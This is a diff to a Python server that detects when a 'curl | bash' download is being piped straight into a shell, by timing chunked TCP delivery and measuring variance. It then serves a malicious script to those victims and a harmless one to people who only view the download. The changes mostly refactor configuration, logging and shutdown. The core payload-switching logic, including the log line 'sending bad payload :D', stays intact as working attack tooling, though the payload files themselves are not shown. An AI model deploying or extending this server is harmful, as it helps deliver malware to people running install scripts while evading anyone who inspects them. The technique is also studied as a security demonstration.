@@ -1,4 +1,5 @@
 from numpy import nanstd
+from textwrap import dedent
 import re
 import socketserver
 import socket
@@ -9,14 +10,14 @@ import os
 class CurlPipeServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
     """HTTP server to detect curl | bash"""
 
-    def __init__(self, server_address):
-        """Accepts a tuple of (HOST, PORT)"""
-
+    def __init__(self):
+        self.host = os.getenv("HOST", "0.0.0.0")
+        self.port = int(os.getenv("PORT", 5555))
         # Socket timeout
         self.socket_timeout = int(os.getenv("SOCKET_TIMEOUT", 10))
 
         # Outbound tcp socket buffer size
-        self.buffer_size = int(os.getenv("BUFFER_SIZE", 87380))
+        self.buffer_size = int(os.getenv("BUFFER_SIZE", 65536))
 
         self.max_padding = int(os.getenv("MAX_PADDING", 32))
 
@@ -31,7 +32,7 @@ class CurlPipeServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
             + "Connection: keep-alive\r\n\r\n"
         ) % time.ctime(time.time())
 
-        socketserver.TCPServer.__init__(self, server_address, HTTPHandler)
+        socketserver.TCPServer.__init__(self, (self.host, self.port), HTTPHandler)
         self.payloads = {}
 
     def setscript(self, uri, params):
@@ -44,6 +45,16 @@ class CurlPipeServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
         bad = open(os.path.join(self.scripts_dir, bad), "r").read()  # Malicious payload
 
         self.payloads[uri] = (null, good, bad, min_jump, max_variance)
+
+    def __str__(self) -> str:
+        return dedent(
+            f"""
+        Listening on {self.host}:{self.port}
+        Socket timeout: {self.socket_timeout}
+        Outbound buffer size: {self.buffer_size}
+        Max padding: {self.max_padding}
+        Scripts directory: {self.scripts_dir}"""
+        )
 
 
 class HTTPHandler(socketserver.BaseRequestHandler):
@@ -130,11 +141,9 @@ class HTTPHandler(socketserver.BaseRequestHandler):
 
         var = nanstd(max_array) ** 2
 
-        self.log(f"Variance = {var}, Maximum Jump = {jump}")
         self.log(f"var < max_var and jump > min_jump: {var} < {max_var} & {jump} > {min_jump}")
 
         # Payload choice
-
         if var < max_var and jump > min_jump:
             self.log("Execution through bash detected - sending bad payload :D")
             self.sendchunk(payload_bad)
@@ -147,15 +156,15 @@ class HTTPHandler(socketserver.BaseRequestHandler):
 
 
 def main():
-    HOST, PORT = os.getenv("HOST", "0.0.0.0"), int(os.getenv("PORT", 5555))
-    SERVER = CurlPipeServer((HOST, PORT))
+    SERVER = CurlPipeServer()
     SERVER.setscript("/", ("ticker.sh", "good.sh", "bad.sh", 1.0, 0.1))
     SERVER.setscript("/bad", ("ticker.sh", "bad.sh", "bad.sh", 1.0, 0.1))
+    print(SERVER)
 
-    print(f"Listening on {HOST} {PORT}")
     try:
         SERVER.serve_forever()
     except KeyboardInterrupt:
+        SERVER.shutdown()
         exit(0)
 
 
